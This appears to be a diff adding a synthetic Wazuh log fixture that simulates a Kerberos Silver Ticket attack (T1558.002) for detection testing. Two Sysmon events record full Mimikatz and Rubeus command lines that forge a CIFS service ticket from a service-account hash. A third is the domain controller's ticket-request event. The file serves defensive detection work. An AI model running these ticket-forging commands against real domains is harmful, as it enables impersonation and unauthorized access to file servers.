@@ -1,0 +1,222 @@
+{
+  "_metadata": {
+    "attack_id": "T1558.002",
+    "variation": "001",
+    "name": "Silver Ticket",
+    "description": "Forging Kerberos service tickets using service account hash",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "credential-access",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - Mimikatz Silver Ticket creation",
+      "sequence": 1,
+      "timestamp": "2026-01-30T07:10:00.000Z",
+      "log": {
+        "rule": {
+          "level": 15,
+          "description": "Sysmon - Event 1: Mimikatz Silver Ticket Attack",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1558.002"
+            ],
+            "tactic": [
+              "Credential Access"
+            ],
+            "technique": [
+              "Silver Ticket"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000037.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 07:10:00.000",
+              "processGuid": "{SILVER-001-0001-000000000001}",
+              "processId": "83000",
+              "image": "C:\\Tools\\mimikatz.exe",
+              "commandLine": "mimikatz.exe \"kerberos::golden /service:cifs /target:fileserver.corp.local /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /rc4:aabbccdd11223344aabbccdd11223344 /user:attacker /ptt\" exit",
+              "currentDirectory": "C:\\Tools\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "High",
+              "hashes": "SHA256=MIMIKATZ_HASH_1234567890ABCDEF1234567890ABCDEF12",
+              "parentProcessGuid": "{SILVER-001-0001-000000000000}",
+              "parentProcessId": "83000",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Rubeus Silver Ticket",
+      "sequence": 2,
+      "timestamp": "2026-01-30T07:10:05.000Z",
+      "log": {
+        "rule": {
+          "level": 15,
+          "description": "Sysmon - Event 1: Rubeus Silver Ticket Attack",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1558.002"
+            ],
+            "tactic": [
+              "Credential Access"
+            ],
+            "technique": [
+              "Silver Ticket"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000037.000002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 07:10:05.000",
+              "processGuid": "{SILVER-001-0001-000000000002}",
+              "processId": "83100",
+              "image": "C:\\Tools\\Rubeus.exe",
+              "commandLine": "Rubeus.exe silver /service:cifs/fileserver.corp.local /rc4:aabbccdd11223344aabbccdd11223344 /user:attacker /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /ptt",
+              "currentDirectory": "C:\\Tools\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "High",
+              "hashes": "SHA256=RUBEUS_HASH_1234567890ABCDEF1234567890ABCDEF1234",
+              "parentProcessGuid": "{SILVER-001-0001-000000000000}",
+              "parentProcessId": "83000",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Windows Security Event - TGS request with forged ticket",
+      "sequence": 3,
+      "timestamp": "2026-01-30T07:10:10.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Windows Security: Kerberos Service Ticket Request",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1558.002"
+            ],
+            "tactic": [
+              "Credential Access"
+            ],
+            "technique": [
+              "Silver Ticket"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "windows",
+            "security"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000037.000003",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "4769",
+              "channel": "Security",
+              "providerName": "Microsoft-Windows-Security-Auditing",
+              "computer": "DC01.corp.local",
+              "level": "0",
+              "task": "14337",
+              "severityValue": "AUDIT_SUCCESS"
+            },
+            "eventdata": {
+              "targetUserName": "attacker@CORP.LOCAL",
+              "targetDomainName": "CORP.LOCAL",
+              "serviceName": "cifs/fileserver.corp.local",
+              "serviceId": "S-1-5-21-1234567890-1234567890-1234567890-1110",
+              "ticketOptions": "0x40810000",
+              "ticketEncryptionType": "0x17",
+              "ipAddress": "::ffff:198.51.100.20",
+              "ipPort": "49666",
+              "status": "0x0"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
